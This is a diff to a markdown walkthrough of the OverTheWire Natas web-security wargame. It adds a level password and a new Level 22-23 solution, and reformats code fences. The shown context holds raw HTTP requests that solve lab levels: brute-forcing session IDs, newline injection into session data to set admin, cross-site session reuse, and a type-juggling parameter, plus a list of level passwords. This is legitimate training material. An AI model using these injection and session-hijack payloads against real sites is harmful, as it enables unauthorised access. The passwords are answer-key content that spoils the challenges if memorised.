@@ -27,6 +27,7 @@ The username is `natas` + the level.
 - 21: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
 - 22: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz
 - 23: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs
+- 24: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd
 
 ## Level 9-10
 
@@ -299,7 +300,7 @@ Final Password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
 
 Burp Suite Intruder with payload: numbers from range 1-640
 
-```txt
+```http
 POST /index.php HTTP/1.1
 Host: natas18.natas.labs.overthewire.org
 Content-Length: 27
@@ -379,7 +380,7 @@ name=test%0aadmin 1
 
 The second one request is basically identical with the addition of the `PHPSESSID` cookie that was returned with the previous request:
 
-```txt
+```http
 Cookie: PHPSESSID=qqd4idecf06se380p402pps375
 
 name=test%0aadmin 1
@@ -391,7 +392,7 @@ This request will return the response with the password for the next level.
 
 First make a post request like the following:
 
-```txt
+```http
 POST /index.php?debug= HTTP/1.1
 Host: natas21-experimenter.natas.labs.overthewire.org
 ```
@@ -404,7 +405,7 @@ align=center&fontsize=100%25&bgcolor=yellow&submit=Update&admin=1
 
 Retrieve the Cookie `PHPSESSID=3h20kvdmafnlfm66cappne72cm` and use it in the request for the other site:
 
-```txt
+```http
 GET / HTTP/1.1
 Host: natas21.natas.labs.overthewire.org
 Cache-Control: max-age=0
@@ -422,7 +423,7 @@ Connection: keep-alive
 
 Make a request like the following:
 
-```txt
+```http
 GET /?revelio= HTTP/1.1
 Host: natas22.natas.labs.overthewire.org
 Cache-Control: max-age=0
@@ -433,4 +434,13 @@ User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Geck
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
 Accept-Encoding: gzip, deflate, br
 Connection: keep-alive
+```
+
+## Level 22-23
+
+Make a request like the following:
+
+```http
+GET /?passwd=20-iloveyou HTTP/1.1
+Host: natas23.natas.labs.overthewire.org
 ```
